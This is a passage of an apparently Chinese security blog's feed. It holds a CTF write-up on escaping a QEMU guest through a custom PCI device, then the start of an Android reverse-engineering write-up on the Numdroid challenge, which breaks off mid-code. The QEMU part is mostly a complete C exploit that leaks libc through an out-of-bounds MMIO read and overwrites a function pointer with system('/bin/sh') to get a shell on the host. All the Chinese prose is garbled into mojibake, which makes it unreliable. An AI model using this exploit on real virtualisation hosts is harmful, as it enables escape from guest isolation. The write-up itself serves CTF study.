class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> __cdecl <span class="title">ccb_dev_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> val; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">55</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_read&quot;</span>);</span><br><span class="line">  val = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      val = ds_0-&gt;index;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      val = ds_0-&gt;buffer[ds_0-&gt;index];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      val = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      val = ds_0-&gt;log_arg;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      val = ds_0-&gt;status;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°å¦‚æœindexåŸŸå¯æ§ï¼Œé‚£ä¹ˆå°±æœ‰ä¸ªè¶Šç•Œè¯»å–</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> vala; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  vala = val;</span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             (Object *)opaque,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">85</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_mmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      ds_0-&gt;index = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      ds_0-&gt;buffer[ds_0-&gt;index] = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( ds_0-&gt;log_handler )</span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;<span class="built_in">log_handler</span>(ds_0-&gt;log_fd, ds_0-&gt;log_format, ds_0-&gt;log_arg);</span><br><span class="line">        ds_0-&gt;status = <span class="number">1074749</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        ds_0-&gt;status = <span class="number">16388413</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      ds_0-&gt;log_arg = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      ds_0-&gt;log_fd = vala;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°indexå¯æ§ï¼Œä¸”æœ‰ä¸ªè¶Šç•Œå†™ï¼Œåœ¨0xCé€‰é¡¹ä¸­æœ‰ä¸ªå‡½æ•°æ‰§è¡Œ</p><p>é‚£ä¹ˆæ€è·¯å°±æ˜¯ï¼š</p><p>è¦†ç›–log_handlerä¸ºsystemï¼Œç„¶ålog_fdä¸º&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œå°±èƒ½å®ç°qemuçš„é€ƒé€¸ï¼Œå¦™ï¼ï¼</p><p>è€Œè¦ä¸MMIOè¿›è¡Œäº¤äº’ å°±å¾—é€šè¿‡<code>resource0</code></p><h4 id="å†™exp"><a href="#å†™exp" class="headerlink" title="å†™exp"></a>å†™exp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_system_offset 0x50d70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> libc_dprintf_offset 0x60a10</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_device_name = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title">getMMIOBase</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>((fd = <span class="built_in">open</span>(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mmio_mem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">getMMIOBase</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">iopl</span>(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem Resource0Base: %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x12</span>);<span class="comment">//set index-&gt;12=fprintf_high</span></span><br><span class="line">    <span class="type">uint32_t</span> index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_fprintf = <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line">    libc_fprintf=libc_fprintf&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    index = <span class="built_in">mmio_read</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] index: %#x.\n&quot;</span>, index);</span><br><span class="line"></span><br><span class="line">    libc_fprintf += <span class="built_in">mmio_read</span>(<span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc_fprintf: 0x%llx.\n&quot;</span>, libc_fprintf);<span class="comment">//dprintf</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="type">uint64_t</span> libcbase=libc_fprintf-libc_dprintf_offset;</span><br><span class="line">    <span class="type">uint64_t</span> system=libcbase+libc_system_offset;</span><br><span class="line">    <span class="type">uint64_t</span> bin_sh=libcbase+<span class="number">0x1d8678</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libcbase: 0x%llx.\n&quot;</span>, libcbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] bin_sh: 0x%llx.\n&quot;</span>, bin_sh);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] system: 0x%llx.\n&quot;</span>, system);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x13</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(bin_sh&amp;<span class="number">0xffffffff</span>));</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x14</span>);</span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,((bin_sh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0</span>,<span class="number">0x11</span>);<span class="comment">//set index-&gt;11=fprintf</span></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0x4</span>,(system&amp;<span class="number">0xffffffff</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">mmio_write</span>(<span class="number">0xc</span>,<span class="number">0xbeef</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„wpæ˜¯ç”±<strong>youlin</strong>å¸ˆå‚…å†™çš„ï¼Œåªåšå­¦ä¹ ä½œç”¨</p></blockquote><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>å…ˆç”¨gdbåŠ è½½è¿™ä¸ªqemuçš„ç¬¦å·è¡¨ï¼Œç„¶åå†é€šè¿‡attach pidæ¥é™„åŠ ä¸Šè¿™ä¸ªqemuè¿›ç¨‹</p><h4 id="åç§»å¯»æ‰¾"><a href="#åç§»å¯»æ‰¾" class="headerlink" title="åç§»å¯»æ‰¾"></a>åç§»å¯»æ‰¾</h4><p>æœ¬åœ°qemuçš„åç§»æ˜¯é€šè¿‡æœ¬åœ°çš„libcç»™çš„ï¼Œä¼šè·Ÿè¿œç¨‹çš„ä¸ä¸€æ ·ï¼Œå› æ­¤è¦å…ˆåœ¨æœ¬åœ°æ‰“é€šä¹‹åï¼Œå†ä¿®æ”¹æˆè¿œç¨‹ç»™çš„dockerçš„libcçš„åç§»ï¼Œæœ€åå°±èƒ½æˆåŠŸgetshell</p><h4 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh:turning off NDELAY mode</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°è·å¾—shellä¹‹åå¯èƒ½ä¼šé‡åˆ°è¿™ç§æƒ…å†µï¼Œyoulinå¸ˆå‚…è¯´è¿™å¯èƒ½æ˜¯ç®¡é“çš„å†²çªï¼Œä½†æ˜¯è¿œç¨‹æ˜¯å¯ä»¥æ‰“é€šçš„</p><p>åœ¨ Guest ç”¨æˆ·æ€ C ä»£ç ä¸­å¯¹ <code>mmio_mem</code> æŒ‡é’ˆçš„æ“ä½œï¼Œæœ€ç»ˆä¼šè§¦å‘ QEMU Host è¿›ç¨‹ä¸­ç›¸åº”çš„è®¾å¤‡æ¨¡æ‹Ÿä»£ç çš„æ‰§è¡Œ</p><p>å½“ä½ é€šè¿‡è¿™ä¸ªæŒ‡é’ˆè¿›è¡Œè¯»å†™æ“ä½œæ—¶ï¼š</p><ol><li>Guest OS å°†<strong>è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€</strong>ã€‚</li><li>QEMU æ‹¦æˆªå¯¹è¿™äº›ç‰¹å®šç‰©ç†åœ°å€çš„è®¿é—®ã€‚</li><li>QEMU è°ƒç”¨å…¶å†…éƒ¨å¯¹åº”çš„è®¾å¤‡æ¨¡å‹ MMIO å¤„ç†å‡½æ•°ï¼ˆå¦‚ <code>ccb_dev_mmio_write</code> &#x2F; <code>read</code> æˆ–é’ˆå¯¹è¯¥è®¾å¤‡çš„å…¶ä»–ç‰¹å®šå‡½æ•°ï¼‰ï¼Œå¹¶å°†åç§»é‡å’Œï¼ˆå¯¹äºå†™å…¥ï¼‰æ•°æ®ä¼ é€’ç»™è¿™äº›å‡½æ•°</li></ol><h2 id="pipeline"><a href="#pipeline" class="headerlink" title="pipeline"></a>pipeline</h2><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">timeout <span class="number">300</span> ./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">1</span>G \</span><br><span class="line">   -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz<span class="number">-5.0</span><span class="number">.5</span>-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure><p>åˆ é™¤timeoutï¼Œå¯ä»¥å‘ç°æ¼æ´åº”è¯¥åœ¨pipelineä¸ŠÂ·</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;qemué€ƒé€¸å­¦ä¹ &quot;&gt;&lt;a href=&quot;#qemué€ƒé€¸å­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;qemué€ƒé€¸å­¦ä¹ &quot;&gt;&lt;/a&gt;qemué€ƒé€¸å­¦ä¹ &lt;/h1&gt;&lt;p&gt;CTFä¸­çš„qemué€ƒé€¸ä¾¿æ˜¯é€šè¿‡åœ¨qemuæºç ä¸­æ³¨å†Œä¸€ä¸ªæ–°çš„pciï¼Œæ¥æ¨¡æ‹ŸçœŸå®ç¯å¢ƒä¸‹çš„æŸä¸€ä¸ªp</summary>
      
    
    
    
    <category term="qemu" scheme="http://s1nec-1o.github.io/categories/qemu/"/>
    
    <category term="è™šæ‹Ÿæœº" scheme="http://s1nec-1o.github.io/categories/qemu/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="qemué€ƒé€¸" scheme="http://s1nec-1o.github.io/tags/qemu%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>Androidé€†å‘ä¹‹Wikiç¯‡</title>
    <link href="http://s1nec-1o.github.io/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/"/>
    <id>http://s1nec-1o.github.io/2025/04/14/Android%E9%80%86%E5%90%91%E4%B9%8BWiki%E7%AF%87/</id>
    <published>2025-04-14T06:44:43.000Z</published>
    <updated>2025-04-14T06:56:13.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é™æ€åˆ†æjavaå±‚"><a href="#é™æ€åˆ†æjavaå±‚" class="headerlink" title="é™æ€åˆ†æjavaå±‚"></a>é™æ€åˆ†æjavaå±‚</h1><h2 id="2014-ASIS-Cyber-Security-Contest-Finals-Numdroid"><a href="#2014-ASIS-Cyber-Security-Contest-Finals-Numdroid" class="headerlink" title="2014 ASIS Cyber Security Contest Finals Numdroid"></a>2014 ASIS Cyber Security Contest Finals Numdroid</h2><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="type">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    super.<span class="built_in">onCreate</span>(savedInstanceState);</span><br><span class="line">    <span class="built_in">setContentView</span>(R.layout.activity_main);</span><br><span class="line">    ArrayTools.<span class="built_in">each_with_index</span>(buttons, <span class="keyword">new</span> <span class="built_in">EachIndexAction</span>&lt;Integer&gt;() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.1</span></span><br><span class="line">        @Override <span class="comment">// io.asis.ctf2014.numdriod.tools.EachIndexAction</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">action</span>(<span class="keyword">final</span> <span class="type">int</span> i, Integer element) &#123;</span><br><span class="line">            ((Button) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(element.<span class="built_in">intValue</span>())).<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.1.1</span></span><br><span class="line">                @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">                    MainActivity.<span class="keyword">this</span>.<span class="built_in">clicked</span>(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">this</span>.mScreen = (EditText) <span class="built_in">findViewById</span>(R.id.editText1);</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setEnabled</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">this</span>.mOk = (ImageButton) <span class="built_in">findViewById</span>(R.id.ok);</span><br><span class="line">    <span class="keyword">this</span>.mDel = (ImageButton) <span class="built_in">findViewById</span>(R.id.del);</span><br><span class="line">    <span class="keyword">this</span>.mOk.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.2</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.<span class="built_in">ok_clicked</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">this</span>.mDel.<span class="built_in">setOnClickListener</span>(<span class="keyword">new</span> View.<span class="built_in">OnClickListener</span>() &#123; <span class="comment">// from class: io.asis.ctf2014.numdriod.MainActivity.3</span></span><br><span class="line">        @Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">onClick</span>(View arg0) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.<span class="built_in">del_clicked</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>é¦–å…ˆéå†æŒ‰é’®æ•°ç»„ï¼Œå¹¶è¿›è¡Œåˆå§‹åŒ–å’Œè®¾ç½®ç‚¹å‡»äº‹ä»¶ <code>MainActivity.this.clicked(i);</code></li><li>ç„¶åå¯¹OKå’ŒdelæŒ‰é’®è¿›è¡Œåˆå§‹åŒ–å¹¶è®¾ç½®ç‚¹å‡»äº‹ä»¶åˆ†åˆ«ä¸º <code>MainActivity.this.ok_clicked();</code> å’Œ <code>MainActivity.this.del_clicked();</code></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">clicked</span><span class="params">(<span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;number: &quot;</span> + i);</span><br><span class="line">    <span class="keyword">this</span>.mScreen.<span class="built_in">setText</span>(<span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>().<span class="built_in">append</span>((CharSequence) Integer.<span class="built_in">toString</span>(i)));</span><br><span class="line">    DebugTools.<span class="built_in">log</span>(<span class="string">&quot;current Pass: &quot;</span> + ((Object) <span class="keyword">this</span>.mScreen.<span class="built_in">getText</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»æŒ‰é’®æ—¶å€™ä¼šå…ˆlogè®°å½•ä¸‹æ¥ï¼Œç„¶åå†å°†æ•°å­—è½¬ä¸ºStringæ˜¾ç¤ºåˆ°å±å¹•ä¸Šï¼Œç„¶åå†logè®°å½•ä¸‹å½“å‰çš„passwd</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> 